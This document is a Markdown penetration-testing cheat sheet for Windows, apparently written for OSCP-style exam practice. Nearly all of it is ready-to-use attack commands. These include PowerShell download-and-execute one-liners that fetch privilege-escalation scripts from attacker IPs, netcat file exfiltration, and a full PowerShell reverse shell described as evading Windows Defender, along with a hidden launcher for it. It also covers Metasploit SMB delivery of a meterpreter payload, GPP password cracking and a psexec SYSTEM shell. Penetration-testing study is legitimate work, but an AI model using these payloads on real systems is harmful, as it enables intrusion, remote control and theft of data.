# Local Recon Tools

* Control Panel: `control.exe`
* Windows Troubleshooting:  `C:\Windows\System32\control.exe /name Microsoft.Troubleshooting`
* 

# Download and Upload stuff

## PS and cmd

### Download

1. `certutil -urlcache -split -f http://source.ip/payload.exe payload.exe`
2. Download the file in PS: 
`Invoke-WebRequest -Uri "url" -OutFile "dest"`
`curl http://xxx/file.xxx -o file.xxx`
3. Download and execute in PS: 
`powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('ip/src')"`

## smb share

* create share in kali
`python3 ~/OSCP_Tools/impacket/smbserver.py xxxshare . -smb2support -username xxx -password xxx`

* use in PS

```
#connect to share
New-SmbMapping -RemotePath '\\server' -Username "domain\username" -Password "password"

#copy

copy share_path target_dir

```
* use in cmd
```
net use \\server /user:domain\username password
```

## Upload

* Powershell
```
#run receiver on listener

nc -lvnp 443 > output.xxx

#send file
Get-Content file.xxx | .\nc.exe IP PORT

#bypass execution policy  if got admin
Set-ExecutionPolicy Unrestricted
```



# Find Stuff

* cmd: `dir /s /b c:\filename` find filename in c: drive recursively
* ps: `Get-Childitem –Path C:\ -Include *filetolookfor* -Exclude *.JPG,*.MP3,*.TMP -File -Recurse -ErrorAction SilentlyContinue`

# Enumeration

## local enumeration

```
powershell.exe -exec bypass -C "IEX(New-Object System.Net.WebClient).DownloadString('http://xxx.xxx.xxx.xxx/Sherlock.ps1');Find-AllVulns"

powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://192.168.1.2:8000/PowerUp.ps1') ; Invoke-AllChecks"

powershell.exe -ExecutionPolicy Bypass -noLogo -Command "IEX(New-Object Net.WebClient).downloadString('http://192.168.1.2:8000/powerup.ps1') ; Invoke-AllChecks"

powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://192.168.1.2:8000/Sherlock.ps1') ; Find-AllVulns"
```
## remote enumeration

* enum4linux

## If you have your ps1 file downloaded to the victim machine then run using this
```
c:\>powershell.exe -exec bypass -Command "& {Import-Module .\Sherlock.ps1; Find-AllVulns}"

c:\>powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}"
```

# Reverse Shells

## Powershell
* This is the most basic reverse shell not detectable by Windows Defender
* Replace xxx as needed:
* raw.ps1

```
$client = New-Object System.Net.Sockets.TCPClient('192.168.219.xxx',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PSReverseShell# ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}$client.Close();
```

* launch on target
```
powershell.exe -NoP -NonI -W Hidden -Exec Bypass "IEX(New-Object Net.WebClient).downloadString('http://192.168.219.xxx/raw.ps1')"
```


## Meterpreter
This shell works even on Windows 11 but needs MSF

1. SMB delivery: `use windows/smb/smb/delivery`
2. Payload: `set payload windows/meterpreter/reverse_tcp`
3. Configure all options in MSF and `exploit`
4. During exploit execution MSF will ask you to run following on target machine: `rundll32.exe \\attacker_ip\PJSK\test.dll,0`
5. Select active session
6. Get shell: `shell`

# Escalation

## Standard Approach
* Download Winpeas: see github
* Follow HackTricks: https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
* If it does not help, go for advances techniques

## SMB

see SMB cheatsheet

## Exposed GPP Password

* Article to read: https://grimhacker.com/2015/04/10/gp3finder-group-policy-preference-password-finder/
* Use gp3finder tool once .xml file with cpassword is founf
`docker run grimhacker/gp3finder -D edBSHOw...`

## Compiling Exploits for Windows on Kali

1. install mingw `apt install mingw-w64`
2. Compile for 64 bit

```
x86_64-w64-mingw32-gcc shell.c -o shell.exe
```
3. Compile for 32 bit
```
i686-w64-mingw32-gcc shell.c -o shell.exe
```

# Post exploitation

* Once Admin privileges obtained get SYSTEM shell
`psexec -accepteula -sid cmd.exe`

* look for stuff
`Get-Childitem –Path C:\ -Include *.txt -File -Recurse -ErrorAction SilentlyContinue`

